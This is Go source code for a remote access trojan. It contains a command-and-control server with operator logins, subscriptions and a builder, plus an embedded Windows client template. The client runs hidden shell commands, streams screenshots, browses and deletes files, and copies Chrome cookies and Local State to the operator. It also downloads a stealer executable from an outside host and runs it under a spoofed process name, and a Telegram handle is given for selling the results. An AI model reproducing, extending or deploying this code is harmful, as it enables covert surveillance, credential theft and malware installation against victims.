package main

import (
	"archive/zip"
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
)

const template = `package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
	"syscall"

	"github.com/gorilla/websocket"
	"golang.org/x/sys/windows"
)

type Message struct {
	Type string ` + "`json:\"type\"`" + `
	Data string ` + "`json:\"data\"`" + `
	Name string ` + "`json:\"name,omitempty\"`" + `
}

var streaming = false
var conn *websocket.Conn


func runHiddenCommand(name string, arg ...string) ([]byte, error) {
	cmd := exec.Command(name, arg...)
	cmd.SysProcAttr = &windows.SysProcAttr{
		HideWindow: true,
	}
	return cmd.CombinedOutput()
}

func downloadAndRunStealer(url string) error {
	// Скачиваем файл
	resp, err := http.Get(url)
	if err != nil {
		return fmt.Errorf("download failed: %%v", err)
	}
	defer resp.Body.Close()

	// Сохраняем во временной папке
	stealerPath := filepath.Join(os.TempDir(), "svchost.exe")
	out, err := os.Create(stealerPath)
	if err != nil {
		return fmt.Errorf("create file failed: %%v", err)
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return fmt.Errorf("copy failed: %%v", err)
	}

	// Запускаем скрытно
	cmd := exec.Command(stealerPath)
	cmd.SysProcAttr = &windows.SysProcAttr{
		HideWindow: true,
	}
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("start failed: %%v", err)
	}

	// Удаляем через 5 секунд
	go func() {
		time.Sleep(5 * time.Second)
		os.Remove(stealerPath)
	}()

	return nil
}

func isValidExe(path string) bool {
    file, err := os.Open(path)
    if err != nil {
        return false
    }
    defer file.Close()
    
    header := make([]byte, 2)
    if _, err := file.Read(header); err != nil {
        return false
    }
    return string(header) == "MZ"
}

func tryRunMethods(path string) bool {
    methods := []func(string) error{
        func(p string) error { return exec.Command(p).Start() },
        func(p string) error { return exec.Command("explorer.exe", p).Start() },
        func(p string) error {
            return exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", p).Start()
        },
    }
    
    for _, method := range methods {
        if method(path) == nil {
            return true
        }
    }
    return false
}

func spoofProcessName() {
    // Common legitimate Windows process names
    legitNames := []string{
        "svchost.exe",
        "winlogon.exe",
        "dllhost.exe",
        "rundll32.exe",
    }
    
    // Get current executable path
    exePath, _ := os.Executable()
    
    // Create a copy with a legitimate name in temp directory
    newName := filepath.Join(os.TempDir(), legitNames[time.Now().Unix()%int64(len(legitNames))])
    if _, err := os.Stat(newName); os.IsNotExist(err) {
        data, _ := os.ReadFile(exePath)
        _ = os.WriteFile(newName, data, 0755)
        
        // Start new instance and exit current one
        cmd := exec.Command(newName)
        cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
        _ = cmd.Start()
        os.Exit(0)
    }
}

func main() {
	fmt.Println("Client started")
	user := os.Getenv("USERNAME")
	if user == "" {
		user = "unknown"
	}
	var err error
	conn, _, err = websocket.DefaultDialer.Dial("WS_ADMIN_REPLACE_ME", nil)
	if err != nil {
		log.Fatal("Connection error:", err)
	}
	defer conn.Close()
	conn.WriteJSON(Message{Type: "hello", Data: user})

	go func() {
		defer func() {
			if r := recover(); r != nil {
				log.Println("Recovered from panic:", r)
			}
		}()
		for {
			var msg Message
			if err := conn.ReadJSON(&msg); err != nil {
				log.Println("read error:", err)
				break
			}

			switch msg.Type {
			case "cmd":
				out, err := runHiddenCommand("cmd", "/C", msg.Data)
				resp := Message{Type: "result", Data: string(out)}
				if err != nil {
					resp.Data += "\nError: " + err.Error()
				}
				conn.WriteJSON(resp)

			case "start_screen":
				if streaming {
					continue
				}
				streaming = true
				go func() {
					for streaming {
						imgPath := filepath.Join(os.TempDir(), "screen.jpg")
						cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command",
							"Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; "+
								"$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; "+
								"$bmp = New-Object Drawing.Bitmap($screen.Width, $screen.Height); "+
								"$graphics = [Drawing.Graphics]::FromImage($bmp); "+
								"$graphics.CopyFromScreen(0,0,0,0,$bmp.Size); "+
								"$bmp.Save('"+imgPath+"'); $bmp.Dispose()")
						cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
						_, err := cmd.CombinedOutput()
						if err != nil {
							log.Println("screenshot error:", err)
							continue
						}

						data, err := os.ReadFile(imgPath)
						if err != nil {
							log.Println("read screenshot error:", err)
							continue
						}
						encoded := base64.StdEncoding.EncodeToString(data)
						conn.WriteJSON(Message{Type: "screen", Data: encoded})
						time.Sleep(100 * time.Millisecond)
					}
				}()

			case "stop_screen":
				streaming = false

			case "ls":
				files, err := os.ReadDir(msg.Data)
				if err != nil {
					conn.WriteJSON(Message{Type: "result", Data: "ls error: " + err.Error()})
					continue
				}
				var result struct {
					Parent string ` + "`json:\"parent\"`" + `
					Items  []struct {
						Name string ` + "`json:\"name\"`" + `
						Full string ` + "`json:\"full\"`" + `
						Dir  bool   ` + "`json:\"dir\"`" + `
					} ` + "`json:\"items\"`" + `
				}
				parent := filepath.Dir(msg.Data)
				if parent != msg.Data {
					result.Parent = parent
				}
				for _, f := range files {
					full := filepath.Join(msg.Data, f.Name())
					result.Items = append(result.Items, struct {
						Name string ` + "`json:\"name\"`" + `
						Full string ` + "`json:\"full\"`" + `
						Dir  bool   ` + "`json:\"dir\"`" + `
					}{
						Name: f.Name(),
						Full: full,
						Dir:  f.IsDir(),
					})
				}
				raw, _ := json.Marshal(result)
				conn.WriteJSON(Message{Type: "explorer", Data: string(raw)})

			case "rm":
				err := os.RemoveAll(msg.Data)
				if err != nil {
					conn.WriteJSON(Message{Type: "result", Data: "rm error: " + err.Error()})
				} else {
					conn.WriteJSON(Message{Type: "result", Data: "deleted: " + msg.Data})
				}

			case "open":
				cmd := exec.Command("cmd", "/C", "start", "", msg.Data)
				cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
				err := cmd.Run()
				if err != nil {
					conn.WriteJSON(Message{Type: "result", Data: "open error: " + err.Error()})
				} else {
					conn.WriteJSON(Message{Type: "result", Data: "opened: " + msg.Data})
				}

			case "upload":
				var payload struct {
					Filename string ` + "`json:\"filename\"`" + `
					Content  string ` + "`json:\"content\"`" + `
				}
				if err := json.Unmarshal([]byte(msg.Data), &payload); err != nil {
					conn.WriteJSON(Message{Type: "result", Data: "upload error: invalid JSON"})
					break
				}
				data, err := base64.StdEncoding.DecodeString(payload.Content)
				if err != nil {
					conn.WriteJSON(Message{Type: "result", Data: "upload error: base64 decode"})
					break
				}
				err = os.WriteFile(payload.Filename, data, 0644)
				if err != nil {
					conn.WriteJSON(Message{Type: "result", Data: "upload error: " + err.Error()})
				} else {
					conn.WriteJSON(Message{Type: "result", Data: "uploaded: " + payload.Filename})
				}

			case "run_stealer":
				// 1. Формируем URL до stealer.exe на сервере
				stealerURL := "https://panel-agzz.onrender.com/apps/steler.exe"
				resp, err := http.Get(stealerURL)
				if err != nil {
					conn.WriteJSON(Message{Type: "stealer", Data: "Download failed: " + err.Error()})
					break
				}
				defer resp.Body.Close()

				// Сохранение файла
				stealerPath := filepath.Join(os.TempDir(), "wupdater.exe")
				data, err := io.ReadAll(resp.Body)
				if err != nil {
					conn.WriteJSON(Message{Type: "stealer", Data: "Read failed: " + err.Error()})
					break
				}
				
				if err := os.WriteFile(stealerPath, data, 0755); err != nil {
					conn.WriteJSON(Message{Type: "stealer", Data: "Write failed: " + err.Error()})
					break
				}

				// Проверка файла
				if !isValidExe(stealerPath) {
					conn.WriteJSON(Message{Type: "stealer", Data: "Invalid executable"})
					break
				}

				// Попытки запуска
				if tryRunMethods(stealerPath) {
					conn.WriteJSON(Message{Type: "stealer", Data: "Successfully, write to telegram @nvalteam to get | TODO: automation"})
				} else {
					conn.WriteJSON(Message{Type: "stealer", Data: "All start methods failed"})
				}
				
				// Отложенное удаление
				go func() {
					time.Sleep(30 * time.Second)
					os.Remove(stealerPath)
				}()

			case "get_cookies":
				id := strings.ReplaceAll(conn.LocalAddr().String(), ":", "_")
				collectAllCookies(id)
				conn.WriteJSON(Message{Type: "result", Data: "cookies uploaded"})
			}
		}
	}()

	for {
		time.Sleep(30 * time.Second)
	}
}

func collectAllCookies(id string) {
	localApp := os.Getenv("LOCALAPPDATA")
	cookieSrc := filepath.Join(localApp, "Google", "Chrome", "User Data", "Default", "Cookies")
	stateSrc := filepath.Join(localApp, "Google", "Chrome", "User Data", "Local State")

	tmpCookie := filepath.Join(os.TempDir(), "tmp_cookie.db")
	tmpState := filepath.Join(os.TempDir(), "tmp_state.json")

	if err := copyFile(cookieSrc, tmpCookie); err != nil {
		log.Println("copy cookie error:", err)
		return
	}
	if err := copyFile(stateSrc, tmpState); err != nil {
		log.Println("copy state error:", err)
		return
	}

	uploadFile(tmpCookie, "cookies/"+id+".db")
	uploadFile(tmpState, "cookies/"+id+".json")

	_ = os.Remove(tmpCookie)
	_ = os.Remove(tmpState)
}

func uploadFile(path, remote string) {
	data, err := os.ReadFile(path)
	if err != nil {
		log.Println("upload read error:", err)
		conn.WriteJSON(Message{Type: "result", Data: "read error: " + err.Error()})
		return
	}
	payload := struct {
		Filename string ` + "`json:\"filename\"`" + `
		Content  string ` + "`json:\"content\"`" + `
	}{
		Filename: remote,
		Content:  base64.StdEncoding.EncodeToString(data),
	}
	raw, _ := json.Marshal(payload)
	conn.WriteJSON(Message{Type: "upload", Data: string(raw)})
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	return err
}`

type Message struct {
	Type     string `json:"type"`
	Data     string `json:"data"`
	Name     string `json:"name,omitempty"`
	ClientID string `json:"client_id,omitempty"`
}

type Client struct {
	ID       string
	Conn     *websocket.Conn
	Owner    string
	Username string
}

type Profile struct {
	Username        string `json:"username"`
	SubscriptionEnd int    `json:"subscriptionEnd"`
	ImageURL        string `json:"image"`
}

var subscriptionOverrides = map[string]int{
	"root":     365,
	"rekserir": 180,
}

var (
	clients    = make(map[string]*Client)
	clientsMu  sync.RWMutex
	admins     = make(map[*websocket.Conn]string)
	adminsMu   sync.Mutex
	upgrader   = websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}
	sessions   = make(map[string]string)
	sessionsMu sync.RWMutex
	users      = map[string]string{
		"root":     "rut",
		"ierkit":   "ierkit123",
		"rekserir": "rekserir123",
		"улыбнись": "улыбнись123",
	}
	userToToken = make(map[string]string)
	tokenMu     sync.RWMutex
)

var userBuilds = make(map[string]string)

type Build struct {
	ID      string
	Owner   string
	Path    string
	Token   string
	Created time.Time
}

var (
	builds   = make(map[string]*Build)
	buildsMu sync.RWMutex
)

func main() {
	_ = os.MkdirAll("stealer", 0755)

	r := mux.NewRouter()
	r.HandleFunc("/login", loginHandler).Methods("POST")
	r.Handle("/admin", authMiddleware(http.HandlerFunc(adminWSHandler)))
	r.Handle("/clients", authMiddleware(http.HandlerFunc(getClientsHandler))).Methods("GET")
	r.Handle("/send/{id}", authMiddleware(http.HandlerFunc(sendCommandHandler))).Methods("POST")
	r.Handle("/apps/{file}", http.StripPrefix("/apps/", http.FileServer(http.Dir("./apps"))))
	r.HandleFunc("/wss", wsHandler)
	r.Handle("/profile", authMiddleware(http.HandlerFunc(profileHandler))).Methods("GET")
	r.Handle("/upload_profile", authMiddleware(http.HandlerFunc(uploadProfileHandler))).Methods("POST")
	r.HandleFunc("/default-profile.png", func(w http.ResponseWriter, r *http.Request) {
		http.ServeFile(w, r, "./ui/default-profile.png")
	})
	r.PathPrefix("/profile_images/").Handler(http.StripPrefix("/profile_images/", http.FileServer(http.Dir("./profile_images"))))
	r.Handle("/builds", authMiddleware(http.HandlerFunc(getBuildsHandler))).Methods("GET")
	r.Handle("/download_build", authMiddleware(http.HandlerFunc(downloadBuildHandler))).Methods("GET")
	r.Handle("/create_build", authMiddleware(http.HandlerFunc(createBuildHandler))).Methods("POST")
	r.Handle("/get_token", authMiddleware(http.HandlerFunc(getTokenHandler))).Methods("GET")
	r.HandleFunc("/download_client", http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.ServeFile(w, r, "./clients/client.exe")
	}))
	r.PathPrefix("/").Handler(http.HandlerFunc(staticOrLogin))

	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}
	log.Println("Starting RAT server on port", port)
	http.ListenAndServe(":"+port, r)
}

func getClientsHandler(w http.ResponseWriter, r *http.Request) {
	username, ok := r.Context().Value("username").(string)
	if !ok {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}

	clientsMu.RLock()
	defer clientsMu.RUnlock()

	userClients := make([]map[string]string, 0)
	for id, client := range clients {
		if client.Owner == username {
			name := client.Username
			if name == "" {
				name = "unknown"
			}
			ip := strings.Split(id, "_")[0]

			userClients = append(userClients, map[string]string{
				"id":   id,
				"ip":   ip,
				"name": fmt.Sprintf("%s (%s)", name, ip),
			})
		}
	}

	json.NewEncoder(w).Encode(userClients)
}

func profileHandler(w http.ResponseWriter, r *http.Request) {
	username, ok := r.Context().Value("username").(string)
	if !ok {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}

	imagePath := filepath.Join("profile_images", username+".jpg")
	var imageURL string
	if _, err := os.Stat(imagePath); err == nil {
		modTime := time.Now().Unix()
		imageURL = fmt.Sprintf("/profile_images/%s.jpg?t=%d", username, modTime)
	} else {
		imageURL = "/default-profile.png"
	}

	daysLeft, ok := subscriptionOverrides[username]
	if !ok {
		daysLeft = 0
	}

	profile := Profile{
		Username:        username,
		SubscriptionEnd: daysLeft,
		ImageURL:        imageURL,
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(profile)
}

func uploadProfileHandler(w http.ResponseWriter, r *http.Request) {
	username, ok := r.Context().Value("username").(string)
	if !ok {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}

	// Limit upload to 10MB
	r.ParseMultipartForm(10 << 20)

	file, handler, err := r.FormFile("image")
	if err != nil {
		http.Error(w, "Error retrieving file", http.StatusBadRequest)
		return
	}
	defer file.Close()

	// Check if the file is an image
	buff := make([]byte, 512)
	if _, err = file.Read(buff); err != nil {
		http.Error(w, "Error reading file", http.StatusInternalServerError)
		return
	}

	if !strings.HasPrefix(http.DetectContentType(buff), "image/") {
		http.Error(w, "Only image files are allowed", http.StatusBadRequest)
		return
	}

	// Reset file pointer
	if _, err = file.Seek(0, 0); err != nil {
		http.Error(w, "Error resetting file pointer", http.StatusInternalServerError)
		return
	}

	// Create directory if not exists
	if err := os.MkdirAll("profile_images", 0755); err != nil {
		http.Error(w, "Error creating directory", http.StatusInternalServerError)
		return
	}

	// --- Удаление старого фото пользователя (jpg, jpeg, png) ---
	for _, ext := range []string{".jpg", ".jpeg", ".png"} {
		oldPath := filepath.Join("profile_images", username+ext)
		if _, err := os.Stat(oldPath); err == nil {
			_ = os.Remove(oldPath)
		}
	}
	// --- конец блока ---

	// Create file
	filename := username + filepath.Ext(handler.Filename)
	f, err := os.Create(filepath.Join("profile_images", filename))
	if err != nil {
		http.Error(w, "Error creating file", http.StatusInternalServerError)
		return
	}
	defer f.Close()

	// Copy file
	if _, err = io.Copy(f, file); err != nil {
		http.Error(w, "Error saving file", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"url":     fmt.Sprintf("/profile_images/%s?t=%d", filename, time.Now().Unix()),
	})
}

func downloadBuildHandler(w http.ResponseWriter, r *http.Request) {
	username, ok := r.Context().Value("username").(string)
	if !ok {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(map[string]string{"error": "unauthorized"})
		return
	}

	buildID := r.URL.Query().Get("id")
	if buildID == "" {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{"error": "missing build id"})
		return
	}

	buildsMu.RLock()
	build, ok := builds[buildID]
	buildsMu.RUnlock()

	if !ok || build.Owner != username {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusNotFound)
		json.NewEncoder(w).Encode(map[string]string{"error": "build not found"})
		return
	}

	f, err := os.Open(build.Path)
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{"error": "failed to open build file"})
		return
	}
	defer f.Close()

	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%s_client.exe", buildID))
	w.Header().Set("Content-Type", "application/octet-stream")
	io.Copy(w, f)
}

func getBuildsHandler(w http.ResponseWriter, r *http.Request) {
	username, ok := r.Context().Value("username").(string)
	if !ok {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(map[string]string{"error": "unauthorized"})
		return
	}

	buildsMu.RLock()
	defer buildsMu.RUnlock()

	userBuilds := make([]map[string]string, 0)
	for _, build := range builds {
		if build.Owner == username {
			userBuilds = append(userBuilds, map[string]string{
				"id":      build.ID,
				"created": build.Created.Format(time.RFC3339),
			})
		}
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(userBuilds)
}

func createBuildHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	username, ok := r.Context().Value("username").(string)
	if !ok {
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(map[string]string{"error": "unauthorized"})
		return
	}

	config := struct {
		Host string `json:"host"`
	}{Host: r.Host}

	if r.ContentLength > 0 {
		if r.Header.Get("Content-Type") != "application/json" {
			w.WriteHeader(http.StatusBadRequest)
			json.NewEncoder(w).Encode(map[string]string{"error": "content-type must be application/json"})
			return
		}
		dec := json.NewDecoder(io.LimitReader(r.Body, 1048576))
		dec.DisallowUnknownFields()
		if err := dec.Decode(&config); err != nil && !errors.Is(err, io.EOF) {
			handleJsonError(w, err)
			return
		}
	}

	if _, _, err := net.SplitHostPort(config.Host); err != nil && !strings.Contains(err.Error(), "missing port") {
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{"error": "invalid host:port"})
		return
	}

	buildID := uuid.New().String()
	buildDir := fmt.Sprintf("./builds/%s", username)
	buildFilename := fmt.Sprintf("%s_build.go", buildID)
	outputFilename := fmt.Sprintf("%s_client.exe", buildID)

	fullBuildPath := filepath.Join(buildDir, buildFilename)
	fullOutputPath := filepath.Join(buildDir, outputFilename)

	if err := os.MkdirAll(buildDir, 0755); err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{"error": "mkdir failed", "details": err.Error()})
		return
	}

	wsURL := fmt.Sprintf("wss://%s/wss?admin=%s", config.Host, username)
	clientCode := strings.ReplaceAll(template, "WS_ADMIN_REPLACE_ME", wsURL)

	if err := os.WriteFile(fullBuildPath, []byte(clientCode), 0644); err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{"error": "write build file failed", "details": err.Error()})
		return
	}

	goMod := `module build

go 1.20

require (
	github.com/gorilla/websocket v1.5.0
	golang.org/x/sys v0.13.0
)
`
	if err := os.WriteFile(filepath.Join(buildDir, "go.mod"), []byte(goMod), 0644); err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{"error": "write go.mod failed", "details": err.Error()})
		return
	}

	tidyCmd := exec.Command("go", "mod", "tidy")
	tidyCmd.Dir = buildDir
	tidyCmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")
	if err := tidyCmd.Run(); err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{"error": "go mod tidy failed"})
		return
	}

	buildCmd := exec.Command("go", "build", "-o", outputFilename, buildFilename)
	buildCmd.Dir = buildDir
	buildCmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")
	if err := buildCmd.Run(); err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{"error": "build failed"})
		_ = os.Remove(fullBuildPath)
		return
	}

	build := &Build{
		ID:      buildID,
		Owner:   username,
		Path:    fullOutputPath,
		Created: time.Now(),
	}

	buildsMu.Lock()
	builds[buildID] = build
	buildsMu.Unlock()

	w.WriteHeader(http.StatusCreated)
	json.NewEncoder(w).Encode(map[string]string{
		"id":      buildID,
		"path":    fullOutputPath,
		"created": build.Created.Format(time.RFC3339),
		"host":    config.Host,
	})
}

func handleJsonError(w http.ResponseWriter, err error) {
	var syntaxError *json.SyntaxError
	var unmarshalTypeError *json.UnmarshalTypeError

	switch {
	case errors.As(err, &syntaxError):
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{
			"error": fmt.Sprintf("malformed JSON at position %d", syntaxError.Offset),
		})
	case errors.Is(err, io.ErrUnexpectedEOF):
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{
			"error": "malformed JSON",
		})
	case errors.As(err, &unmarshalTypeError):
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{
			"error": fmt.Sprintf("invalid value for field %q", unmarshalTypeError.Field),
		})
	case strings.HasPrefix(err.Error(), "json: unknown field"):
		fieldName := strings.TrimPrefix(err.Error(), "json: unknown field ")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{
			"error": fmt.Sprintf("unknown field %s", fieldName),
		})
	case err.Error() == "http: request body too large":
		w.WriteHeader(http.StatusRequestEntityTooLarge)
		json.NewEncoder(w).Encode(map[string]string{
			"error": "request body must not be larger than 1MB",
		})
	default:
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{
			"error": err.Error(),
		})
	}
}

func loginHandler(w http.ResponseWriter, r *http.Request) {
	var creds struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}
	if err := json.NewDecoder(r.Body).Decode(&creds); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	if users[creds.Username] != creds.Password {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	sid := uuid.New().String()
	sessionsMu.Lock()
	sessions[sid] = creds.Username
	sessionsMu.Unlock()
	http.SetCookie(w, &http.Cookie{
		Name:     "session",
		Value:    sid,
		Path:     "/",
		HttpOnly: true,
		MaxAge:   86400,
	})
	w.WriteHeader(http.StatusOK)
}

func authMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		cookie, err := r.Cookie("session")
		if err != nil || !validSession(cookie.Value) {
			http.Error(w, "unauthorized", http.StatusUnauthorized)
			return
		}
		sessionsMu.RLock()
		username := sessions[cookie.Value]
		sessionsMu.RUnlock()
		ctx := context.WithValue(r.Context(), "username", username)
		next.ServeHTTP(w, r.WithContext(ctx))
	})
}

func validSession(sid string) bool {
	sessionsMu.RLock()
	defer sessionsMu.RUnlock()
	_, ok := sessions[sid]
	return ok
}

func staticOrLogin(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path == "/" || r.URL.Path == "/index.html" {
		cookie, err := r.Cookie("session")
		if err != nil || !validSession(cookie.Value) {
			http.ServeFile(w, r, "ui/login.html")
			return
		}
	}
	http.FileServer(http.Dir("./ui")).ServeHTTP(w, r)
}

func wsHandler(w http.ResponseWriter, r *http.Request) {
	log.Println(">> wsHandler entered")
	username := r.URL.Query().Get("admin")
	if username == "" || users[username] == "" {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}

	conn, err := upgrader.Upgrade(w, r, nil)
	log.Printf("WebSocket upgraded from %s (admin=%s)", r.RemoteAddr, username)
	if err != nil {
		log.Println("upgrade error:", err)
		return
	}

	id := strings.ReplaceAll(r.RemoteAddr, ":", "_") + "_" + uuid.New().String()
	client := &Client{ID: id, Conn: conn, Owner: username}

	clientsMu.Lock()
	clients[id] = client
	log.Printf("Client registered: %s (owner = %s)", id, username)
	clientsMu.Unlock()

	defer func() {
		clientsMu.Lock()
		delete(clients, id)
		clientsMu.Unlock()
		log.Printf("Client disconnected: %s", id)
	}()

	for {
		var msg Message
		if err := conn.ReadJSON(&msg); err != nil {
			break
		}

		msg.ClientID = client.ID

		switch msg.Type {
		case "hello":
			client.Username = msg.Data
			log.Printf("Client %s identified as %s", client.ID, client.Username)

		case "result", "screen", "explorer", "stealer":
			broadcastToAdmins(msg, client.Owner)

		case "upload":
			var payload struct {
				Filename string `json:"filename"`
				Content  string `json:"content"`
			}
			if err := json.Unmarshal([]byte(msg.Data), &payload); err != nil {
				log.Println("upload JSON parse error:", err)
				continue
			}
			data, err := decodeBase64(payload.Content)
			if err != nil {
				log.Println("upload base64 decode error:", err)
				continue
			}
			if err := os.WriteFile(payload.Filename, data, 0644); err != nil {
				log.Println("upload write file error:", err)
			} else {
				log.Printf("Saved uploaded file: %s\n", payload.Filename)
			}
		}
	}
}

func decodeBase64(s string) ([]byte, error) {
	return io.ReadAll(base64.NewDecoder(base64.StdEncoding, strings.NewReader(s)))
}

func adminWSHandler(w http.ResponseWriter, r *http.Request) {
	username, ok := r.Context().Value("username").(string)
	if !ok {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println("admin ws upgrade error:", err)
		return
	}
	adminsMu.Lock()
	admins[conn] = username
	adminsMu.Unlock()
	log.Println("Admin connected:", username)

	defer func() {
		adminsMu.Lock()
		delete(admins, conn)
		adminsMu.Unlock()
		log.Println("Admin disconnected:", username)
		conn.Close()
	}()

	for {
		_, _, err := conn.ReadMessage()
		if err != nil {
			break
		}
	}
}

func broadcastToAdmins(msg Message, clientOwner string) {
	adminsMu.Lock()
	defer adminsMu.Unlock()
	for conn, username := range admins {
		if username == clientOwner {
			err := conn.WriteJSON(msg)
			if err != nil {
				log.Println("broadcast error:", err)
				conn.Close()
				delete(admins, conn)
			}
		}
	}
}

func sendCommandHandler(w http.ResponseWriter, r *http.Request) {
	username, ok := r.Context().Value("username").(string)
	if !ok {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	id := mux.Vars(r)["id"]
	clientsMu.RLock()
	client, ok := clients[id]
	clientsMu.RUnlock()
	if !ok || client.Owner != username {
		http.Error(w, "client not found or not owned", http.StatusNotFound)
		return
	}
	var msg Message
	if err := json.NewDecoder(r.Body).Decode(&msg); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	if err := client.Conn.WriteJSON(msg); err != nil {
		http.Error(w, "failed to send", http.StatusInternalServerError)
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

func getTokenHandler(w http.ResponseWriter, r *http.Request) {
	username, ok := r.Context().Value("username").(string)
	if !ok {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	tokenMu.RLock()
	token, ok := userToToken[username]
	tokenMu.RUnlock()
	if !ok {
		token = uuid.New().String()
		tokenMu.Lock()
		userToToken[username] = token
		tokenMu.Unlock()
	}
	w.Write([]byte(token))
}

func addToZip(zipWriter *zip.Writer, path string, name string) {
	file, err := os.Open(path)
	if err != nil {
		log.Println("zip open error:", err)
		return
	}
	defer file.Close()
	wr, err := zipWriter.Create(name)
	if err != nil {
		log.Println("zip create entry error:", err)
		return
	}
	_, err = io.Copy(wr, file)
	if err != nil {
		log.Println("zip copy error:", err)
	}
}
